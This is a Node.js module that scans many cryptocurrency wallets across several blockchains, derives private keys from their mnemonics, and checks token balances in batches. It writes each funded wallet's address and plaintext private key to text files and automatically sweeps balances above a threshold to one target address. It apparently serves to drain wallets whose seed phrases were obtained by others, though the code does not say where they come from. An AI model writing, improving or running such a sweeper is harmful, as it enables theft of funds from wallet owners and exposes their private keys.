const fs = require('fs');
const path = require('path');
const HdKeyring = require('@metamask/eth-hd-keyring');
const { BALANCE_CHECKER_ABI } = require('../config/abi');
const { TOKEN_ADDRESSES, CHAIN_CONFIG, SCAN_DEFAULTS } = require('../config/constants');
const { getWeb3 } = require('../utils/web3Pool');
const SendCoinManager = require('./sendCoin.service');
const logger = require('../utils/logger');

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const OUTPUT_DIR = process.cwd();

// --- File streams: write immediately, no string accumulation ---

const fileStreams = {};

function getStream(filename) {
  if (!fileStreams[filename]) {
    fileStreams[filename] = fs.createWriteStream(path.join(OUTPUT_DIR, filename), { flags: 'a' });
  }
  return fileStreams[filename];
}

function writeToFile(filename, content) {
  getStream(filename).write(content);
}

function closeAllStreams() {
  for (const key of Object.keys(fileStreams)) {
    fileStreams[key].end();
    delete fileStreams[key];
  }
}

// --- Private key export for mnemonic wallets ---

async function ensurePrivateKey(wallet) {
  if (!wallet.privateKey && wallet.mnemonic) {
    const keyring = new HdKeyring({ mnemonic: wallet.mnemonic, numberOfAccounts: 5 });
    wallet.privateKey = await keyring.exportAccount(wallet.address);
  }
}

// --- Sweep logic ---

async function trySweep(web3, wallet, targetAddress, value, gasPrice, gasLimit, explorerUrl, amount, token) {
  const fee = BigInt(gasPrice) * BigInt(gasLimit);
  if (BigInt(value) <= fee) return;

  try {
    const manager = new SendCoinManager(web3);
    const txHash = await manager.sendWithGas(wallet.privateKey, targetAddress, gasPrice, gasLimit);
    if (txHash) {
      wallet.balances[wallet.balances.length - 1].txHash = txHash;
      logger.info({ address: wallet.address, txHash }, 'Funds swept');
      writeToFile('VIP.txt', `${explorerUrl}/address/${wallet.address} : ${wallet.privateKey} : ${amount} ${token}\n`);
    }
  } catch (err) {
    logger.error({ address: wallet.address, err }, 'Sweep error');
  }

  await sleep(1000);
}

// --- Balance checking ---

async function checkTokenBalances({ web3, contract, wallets, token, tokenAddress, chainName, chainConfig, targetAddress }) {
  const gasLimit = chainConfig.gasLimit || 21000n;
  const { explorerUrl, batchSize } = chainConfig;
  let gasPrice = null;
  const totalWallets = wallets.length;

  for (let offset = 0; offset < totalWallets; offset += batchSize) {
    // Build address batch directly from wallets array — no intermediate copy
    const end = Math.min(offset + batchSize, totalWallets);
    const batchAddresses = [];
    for (let k = offset; k < end; k++) {
      batchAddresses.push(wallets[k].address);
    }

    try {
      const data = await contract.methods.balances(batchAddresses, tokenAddress).call();

      for (let i = 0; i < data.length; i++) {
        const value = data[i];
        const wallet = wallets[offset + i]; // direct index — no Map, no find()

        const amount = web3.utils.fromWei(value, 'ether');
        wallet.balances.push({ chain: chainName, token, balance: amount });

        if (value === '0' || value === 0n) continue;

        await ensurePrivateKey(wallet);

        // Write to file immediately — no string accumulation
        writeToFile('COIN.txt', `${explorerUrl}/address/${wallet.address} : ${wallet.privateKey} : ${amount} ${token}\n`);
        writeToFile('address-coin.txt', `${wallet.address}:${wallet.privateKey}\n`);

        // Sweep if above threshold
        if (targetAddress && parseFloat(amount) > SCAN_DEFAULTS.balanceThreshold) {
          if (!gasPrice) {
            gasPrice = chainConfig.fixedGasPrice || await web3.eth.getGasPrice();
            logger.info({ chainName, gasPrice: gasPrice.toString(), gasLimit: gasLimit.toString() }, 'Gas info');
          }
          await trySweep(web3, wallet, targetAddress, value, gasPrice, gasLimit, explorerUrl, amount, token);
        }
      }
    } catch (error) {
      logger.error({ chainName, token, err: error }, 'Error checking balances batch');
    }

    await sleep(500);
  }
}

// --- Main entry ---

async function run(apiKey, addresses, tokens, chains, targetAddress) {
  try {
    for (const chainName of chains) {
      const chainConfig = CHAIN_CONFIG[chainName];
      if (!chainConfig) {
        logger.warn({ chainName }, 'Unknown chain, skipping');
        continue;
      }

      try {
        const web3 = getWeb3(chainConfig.key, apiKey);
        const tokenAddresses = TOKEN_ADDRESSES[chainConfig.key];
        const contractAddress = chainConfig.balanceCheckerAddress;
        const contract = new web3.eth.Contract(BALANCE_CHECKER_ABI, contractAddress, {
          from: contractAddress
        });

        for (const token of tokens) {
          const addr = tokenAddresses[token];
          const tokenAddress = [
            (!addr || token === 'NATIVE')
              ? '0x0000000000000000000000000000000000000000'
              : addr
          ];

          await checkTokenBalances({
            web3, contract, wallets: addresses,
            token, tokenAddress, chainName, chainConfig, targetAddress
          });
        }

        logger.info({ chainName }, 'Chain scan complete');
      } catch (error) {
        logger.error({ chainName, err: error }, 'Error processing chain');
      }
    }
  } finally {
    closeAllStreams();
  }

  return addresses;
}

module.exports = { run };
